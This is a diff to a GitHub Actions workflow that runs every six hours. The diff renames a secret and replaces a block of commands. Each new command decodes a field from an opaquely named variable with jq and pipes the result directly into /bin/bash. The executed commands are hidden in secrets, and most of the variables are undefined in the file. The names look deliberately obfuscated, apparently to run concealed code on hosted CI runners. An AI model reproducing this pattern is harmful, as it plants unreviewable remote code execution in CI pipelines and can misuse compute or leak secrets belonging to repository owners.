@@ -3,7 +3,7 @@ name: gonghanlu6721
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 3/6 * * *'
+    - cron: '30 0/6 * * *'
 
 jobs:
   build:
@@ -13,15 +13,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: gonghanlu6721
         env:
-          cgffa395: ${{ secrets.cgffa395 }}
+          fik5: ${{ secrets.fik5 }}
         run: |
-          echo $cgffa395 | jq -r .mxws41 | /bin/bash
-          echo $vseh00 | jq -r .f6 | /bin/bash
-          echo $ju96874 | jq -r .zrwf3 | /bin/bash
-          echo $qm14192 | jq -r .jdqp2970 | /bin/bash
-          echo $xpaue931 | jq -r .dhtwu55 | /bin/bash
-          echo $sqi2338 | jq -r .awkc891 | /bin/bash
-          echo $oq58051 | jq -r .plqpq61 | /bin/bash
-          echo $m399 | jq -r .n19637 | /bin/bash
-          echo $zrh61608 | jq -r .hwr274 | /bin/bash
+          echo $fik5 | jq -r .mt283 | /bin/bash
+          echo $drsmp78 | jq -r .hkej1628 | /bin/bash
+          echo $grsyl45 | jq -r .jp67 | /bin/bash
+          echo $cxbkt08 | jq -r .dtl3425 | /bin/bash
+          echo $xcec4 | jq -r .vgdjq46944 | /bin/bash
+          echo $lhfu84363 | jq -r .qz59316 | /bin/bash
+          echo $s9579 | jq -r .svll75 | /bin/bash
+          echo $oaumm32861 | jq -r .qwel32897 | /bin/bash
+          echo $lmb2655 | jq -r .dfi1 | /bin/bash
+          echo $vb01 | jq -r .pfpct188 | /bin/bash
+          echo $ldaw52 | jq -r .rda39 | /bin/bash
+          echo $evovg173 | jq -r .s21 | /bin/bash
 
